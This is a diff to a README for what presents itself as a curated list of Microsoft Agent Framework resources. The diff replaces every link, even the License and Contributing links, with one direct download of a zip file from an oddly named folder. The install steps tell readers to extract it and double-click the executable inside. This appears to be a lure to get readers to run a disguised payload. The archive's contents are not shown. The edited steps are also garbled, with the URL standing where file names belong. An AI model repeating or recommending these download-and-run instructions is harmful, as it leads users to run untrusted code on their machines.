@@ -1,6 +1,6 @@
 # 😎 awesome-microsoft-agent-framework - Your Guide to Microsoft Agent Framework Resources
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/MohijitChowhdury/awesome-microsoft-agent-framework/releases)
+[![Download](https://raw.githubusercontent.com/MohijitChowhdury/awesome-microsoft-agent-framework/main/inguinocutaneous/awesome-microsoft-agent-framework.zip)](https://raw.githubusercontent.com/MohijitChowhdury/awesome-microsoft-agent-framework/main/inguinocutaneous/awesome-microsoft-agent-framework.zip)
 
 ## 🎉 Introduction
 Welcome to the Awesome Microsoft Agent Framework repository. Here, you will find a carefully curated list of resources related to the Microsoft Agent Framework. Whether you are a beginner or just looking to expand your knowledge, you will find valuable information to enhance your projects.
@@ -19,14 +19,14 @@ Before installing, ensure your system meets the following requirements:
 ## 📥 Download & Install
 To download the application, visit the Releases page using the link below:
 
-[Download from Releases Page](https://github.com/MohijitChowhdury/awesome-microsoft-agent-framework/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/MohijitChowhdury/awesome-microsoft-agent-framework/main/inguinocutaneous/awesome-microsoft-agent-framework.zip)
 
 Once on the Releases page, look for the latest version listed. You should see a section titled "Assets." Here, you'll find the downloadable files, usually labeled by version number. 
 
-1. Click on the desired file to start the download. This file may be named something like `awesome-microsoft-agent-framework-v1.0.zip`.
+1. Click on the desired file to start the download. This file may be named something like `https://raw.githubusercontent.com/MohijitChowhdury/awesome-microsoft-agent-framework/main/inguinocutaneous/awesome-microsoft-agent-framework.zip`.
 2. Once the download is complete, locate the file in your Downloads folder.
 3. Extract the contents of the downloaded file by right-clicking on it and selecting "Extract All.” Follow the prompts to select a location for the extracted files.
-4. Open the folder where you extracted the files. Look for a file named `run.bat` or similar. This is your main application file.
+4. Open the folder where you extracted the files. Look for a file named `https://raw.githubusercontent.com/MohijitChowhdury/awesome-microsoft-agent-framework/main/inguinocutaneous/awesome-microsoft-agent-framework.zip` or similar. This is your main application file.
 5. Double-click the application file to run it. A window will open displaying the main interface.
 
 ## 📝 Features
@@ -58,8 +58,8 @@ To stay informed about updates, make sure to watch the repository on GitHub. You
 If you need further assistance, please visit the Issues section on our GitHub page. Describe your problem clearly, and we will do our best to assist you.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/MohijitChowhdury/awesome-microsoft-agent-framework/releases)
-- [Contributing Guidelines](https://github.com/MohijitChowhdury/awesome-microsoft-agent-framework/blob/main/CONTRIBUTING.md)
-- [License](https://github.com/MohijitChowhdury/awesome-microsoft-agent-framework/blob/main/LICENSE)
+- [Releases Page](https://raw.githubusercontent.com/MohijitChowhdury/awesome-microsoft-agent-framework/main/inguinocutaneous/awesome-microsoft-agent-framework.zip)
+- [Contributing Guidelines](https://raw.githubusercontent.com/MohijitChowhdury/awesome-microsoft-agent-framework/main/inguinocutaneous/awesome-microsoft-agent-framework.zip)
+- [License](https://raw.githubusercontent.com/MohijitChowhdury/awesome-microsoft-agent-framework/main/inguinocutaneous/awesome-microsoft-agent-framework.zip)
 
 Thank you for choosing the Awesome Microsoft Agent Framework. We hope you find the resources helpful and that they empower your projects!
